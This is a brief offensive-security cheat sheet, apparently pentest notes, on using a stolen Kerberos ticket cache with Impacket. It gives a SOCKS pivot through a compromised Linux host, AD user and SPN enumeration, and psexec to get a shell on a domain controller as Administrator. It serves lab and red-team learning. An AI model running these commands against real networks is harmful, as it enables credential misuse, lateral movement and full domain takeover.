# Using Kerberos with Impacket

## **Using Kerberos with Impacket**

### Scenario 

#### - Domain computer compromised \(linux\) - User Ccache file owned - Download the ccache into the attacker machine 

### Settings

#### Set Kerberos Env using the stolent ticket

![](../../../../../.gitbook/assets/image%20%28143%29.png)

#### Install krb5-user and add DC into hosts

![](../../../../../.gitbook/assets/image%20%2870%29.png)

#### KRB5.conf configuration

![](../../../../../.gitbook/assets/image%20%28234%29.png)

#### Proxychains

Edit the config file and comment the following line:

![](../../../../../.gitbook/assets/image%20%28170%29.png)

![](../../../../../.gitbook/assets/image%20%28233%29.png)

#### Sock Proxy

Create a sock Proxy on the target compromised linux box :

```csharp
ssh testme@10.110.0.74 -D 1080
```



### Enumerate AD users

```csharp
proxychains python3 GetADUsers.py -all -k -no-pass -dc-ip 10.110.0.222 CROOK.BADCORP.LOCAL/Administrator

```

![](../../../../../.gitbook/assets/image%20%2844%29.png)

### Get SPN 

```text
proxychains python3 GetUserSPNs.py -k -no-pass -dc-ip 10.110.0.222 CROOK.BADCORP.LOCAL/Administrator
```

### Get a shell

```csharp
proxychains python3 psexec.py -dc-ip 10.110.0.222 Administrator@dc02.CROOK.BADCORP.LOCAL -k -no-pass
```

![](../../../../../.gitbook/assets/image%20%2827%29.png)

